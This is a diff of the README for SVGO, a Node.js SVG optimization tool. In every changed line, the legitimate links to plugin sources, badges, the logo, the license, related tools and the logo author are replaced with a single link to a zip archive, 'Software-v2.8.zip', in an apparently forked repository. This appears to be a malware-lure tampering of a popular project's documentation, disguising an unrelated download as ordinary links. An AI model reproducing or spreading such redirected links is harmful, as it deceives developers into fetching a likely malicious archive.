@@ -1,12 +1,12 @@
-**english** | [русский](https://github.com/svg/svgo/blob/master/README.ru.md)
+**english** | [русский](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
 - - -
 
-<img src="http://soulshine.in/svgo.svg" width="200" height="200" alt="logo"/>
+<img src="https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip" width="200" height="200" alt="logo"/>
 
-## SVGO [![NPM version](https://badge.fury.io/js/svgo.svg)](https://npmjs.org/package/svgo) [![Dependency Status](https://gemnasium.com/svg/svgo.png)](https://gemnasium.com/svg/svgo) [![Build Status](https://secure.travis-ci.org/svg/svgo.svg)](https://travis-ci.org/svg/svgo) [![Coverage Status](https://img.shields.io/coveralls/svg/svgo.svg)](https://coveralls.io/r/svg/svgo?branch=master)
+## SVGO [![NPM version](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) [![Dependency Status](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) [![Build Status](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) [![Coverage Status](https://img.shields.io/coveralls/svg/svgo.svg)](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
 
 **SVG O**ptimizer is a Nodejs-based tool for optimizing SVG vector graphics files.
-![](https://mc.yandex.ru/watch/18431326)
+![](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
 
 ## Why?
 
@@ -18,40 +18,40 @@ SVGO has a plugin-based architecture, so almost every optimization is a separate
 
 Today we have:
 
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/cleanupAttrs.js) ] cleanup attributes from newlines, trailing and repeating spaces
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeDoctype.js) ] remove doctype declaration
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeXMLProcInst.js) ] remove XML processing instructions
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeComments.js) ] remove comments
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeMetadata.js) ] remove `<metadata>`
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeTitle.js) ] remove `<title>` (disabled by default)
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeDesc.js) ] remove `<desc>` (disabled by default)
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeEditorsNSData.js) ] remove editors namespaces, elements and attributes
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeEmptyAttrs.js) ] remove empty attributes
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeHiddenElems.js) ] remove hidden elements
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeEmptyText.js) ] remove empty Text elements
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeEmptyContainers.js) ] remove empty Container elements
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeViewBox.js) ] remove `viewBox` attribute when possible (disabled by default)
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/cleanupEnableBackground.js) ] remove or cleanup `enable-background` attribute when possible
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/convertStyleToAttrs.js) ] convert styles into attributes
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/convertColors.js) ] convert colors (from `rgb()` to `#rrggbb`, from `#rrggbb` to `#rgb`)
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/convertPathData.js) ] convert Path data to relative or absolute whichever is shorter, convert one segment to another, trim useless delimiters, smart rounding and much more
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/convertTransform.js) ] collapse multiple transforms into one, convert matrices to the short aliases and much more
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeUnknownsAndDefaults.js) ] remove unknown elements content and attributes, remove attrs with default values
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeNonInheritableGroupAttrs.js) ] remove non-inheritable group's "presentation" attributes
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeUselessStrokeAndFill.js) ] remove useless stroke and fill attrs (disabled by default)
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeUnusedNS.js) ] remove unused namespaces declaration
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/cleanupIDs.js) ] remove unused and minify used IDs
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/cleanupNumericValues.js) ] round numeric values to the fixed precision, remove default 'px' units
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/moveElemsAttrsToGroup.js) ] move elements attributes to the existing group wrapper
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/moveGroupAttrsToElems.js) ] move some group attributes to the content elements
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/collapseGroups.js) ] collapse useless groups
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/removeRasterImages.js) ] remove raster images (disabled by default)
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/mergePaths.js) ] merge multiple Paths into one
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/convertShapeToPath.js) ] convert some basic shapes to path
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/sortAttrs.js) ] sort element attributes for epic readability (disabled by default)
-* [ [>](https://github.com/svg/svgo/blob/master/plugins/transformsWithOnePath.js) ] apply transforms, crop by real width, center vertical alignment and resize SVG with one Path inside (disabled by default)
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] cleanup attributes from newlines, trailing and repeating spaces
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove doctype declaration
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove XML processing instructions
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove comments
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove `<metadata>`
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove `<title>` (disabled by default)
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove `<desc>` (disabled by default)
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove editors namespaces, elements and attributes
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove empty attributes
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove hidden elements
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove empty Text elements
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove empty Container elements
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove `viewBox` attribute when possible (disabled by default)
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove or cleanup `enable-background` attribute when possible
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] convert styles into attributes
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] convert colors (from `rgb()` to `#rrggbb`, from `#rrggbb` to `#rgb`)
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] convert Path data to relative or absolute whichever is shorter, convert one segment to another, trim useless delimiters, smart rounding and much more
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] collapse multiple transforms into one, convert matrices to the short aliases and much more
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove unknown elements content and attributes, remove attrs with default values
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove non-inheritable group's "presentation" attributes
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove useless stroke and fill attrs (disabled by default)
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove unused namespaces declaration
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove unused and minify used IDs
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] round numeric values to the fixed precision, remove default 'px' units
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] move elements attributes to the existing group wrapper
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] move some group attributes to the content elements
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] collapse useless groups
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove raster images (disabled by default)
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] merge multiple Paths into one
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] convert some basic shapes to path
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] sort element attributes for epic readability (disabled by default)
+* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] apply transforms, crop by real width, center vertical alignment and resize SVG with one Path inside (disabled by default)
 
-Want to know how it works and how to write your own plugin? [Of course you want to](https://github.com/svg/svgo/blob/master/docs/how-it-works/en.md).
+Want to know how it works and how to write your own plugin? [Of course you want to](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip).
 
 
 ## How to use
@@ -116,13 +116,13 @@ Arguments:
 
         $ svgo test.svg -o - | gzip -cfq9 > test.svgz
 
-* with GUI – [svgo-gui](https://github.com/svg/svgo-gui)
-* as a web app - [SVGOMG](https://jakearchibald.github.io/svgomg/)
-* as a Nodejs module – [examples](https://github.com/svg/svgo/tree/master/examples)
-* as a Grunt task – [grunt-svgmin](https://github.com/sindresorhus/grunt-svgmin)
-* as a Gulp task – [gulp-svgmin](https://github.com/ben-eb/gulp-svgmin)
-* as a Mimosa module – [mimosa-minify-svg](https://github.com/dbashford/mimosa-minify-svg)
-* as an OSX Folder Action – [svgo-osx-folder-action](https://github.com/svg/svgo-osx-folder-action)
+* with GUI – [svgo-gui](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
+* as a web app - [SVGOMG](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
+* as a Nodejs module – [examples](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
+* as a Grunt task – [grunt-svgmin](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
+* as a Gulp task – [gulp-svgmin](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
+* as a Mimosa module – [mimosa-minify-svg](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
+* as an OSX Folder Action – [svgo-osx-folder-action](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
 
 ## Donate
 
@@ -130,6 +130,6 @@ BTC `1zVZYqRSzQ4aaL27rp3PLwFFSXpfs5H8r`
 
 ## License and copyrights
 
-This software is released under the terms of the [MIT license](https://github.com/svg/svgo/blob/master/LICENSE).
+This software is released under the terms of the [MIT license](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip).
 
-Logo by [Yegor Bolshakov](http://xizzzy.ru/).
+Logo by [Yegor Bolshakov](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip).
